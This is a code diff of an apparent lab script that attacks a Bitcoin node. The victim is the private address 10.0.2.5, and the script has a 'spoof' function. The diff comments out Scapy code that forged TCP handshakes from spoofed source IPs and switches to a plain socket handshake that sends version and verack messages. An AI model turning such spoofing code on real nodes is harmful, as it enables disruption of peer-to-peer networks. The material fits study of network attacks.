@@ -12,7 +12,7 @@ from bitcoin.net import CAddress
 
 
 victim_ip = '10.0.2.5'
-victim_port = 833
+victim_port = 8333
 attacker_port = random.randint(1024,65535)
 
 pending_spoof_IPs = []
@@ -45,47 +45,40 @@ def spoof(src_ip, dst_ip):
 	dst_port = victim_port
 	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
 	
-	ip = IP(src=src_ip, dst=dst_ip)
-
+	#ip = IP(src=src_ip, dst=dst_ip)
 	#SYN = TCP(sport=src_port, dport=dst_port, flags='A', seq=seq)
-	SYN = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
+	#SYN = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
 	#SYNACK=sr1(ip/SYN)
-
 	#send(SYNACK)
-	time.sleep(1)
-
-	print('Sending second packet')
+	#time.sleep(1)
+	#print('Sending second packet')
 	#ACK=TCP(sport=src_port, dport=dst_port, flags="S", seq=seq, ack=SYNACK.seq)
-	ACK=TCP(sport=src_port, dport=dst_port, flags='A', seq=SYNACK.ack + 1, ack=SYNACK.seq + 2+)
-	send(ip/ACK)
-
-	#pkt_spoof = ip/tcp
-
-	print('Handshake COMPLETE')
+	#ACK=TCP(sport=src_port, dport=dst_port, flags='A', seq=SYNACK.ack + 1, ack=SYNACK.seq + 2+)
+	#send(ip/ACK)
+	#print('Handshake COMPLETE')
 
 	
-	#s = socket.socket()#socket.AF_INET, socket.SOCK_STREAM)
+	s = socket.socket()#socket.AF_INET, socket.SOCK_STREAM)
 	#s.bind((src_ip, 0))
-	connect((dst_ip, dst_port))
+	s.connect((dst_ip, dst_port))
 	# Send version packet
-	send(version_pkt(src_ip, dst_ip, dst_port).to_bytes())
+	s.send(version_pkt(src_ip, dst_ip, dst_port).to_bytes())
 	# Get verack packet
 	print('\n\n*** ')
-	print(recv(1924))
+	print(s.recv(1924))
 	# Send verack packet
 	
-	send(msg_verack().to_bytes())
+	s.send(msg_verack().to_bytes())
 	# Get verack packet
 	print('\n\n*** ')
-	print(recv(1024))
+	print(s.recv(1024))
 
 
 	print('\n\n*** ')
 	print('CONNECTION ESTABLISHED')
-
-	s.close()
-
-	print('CONNECTION CLOSED')
+	#time.sleep(5)
+	#s.close()
+	#print('CONNECTION CLOSED')
 
 
 	#try:
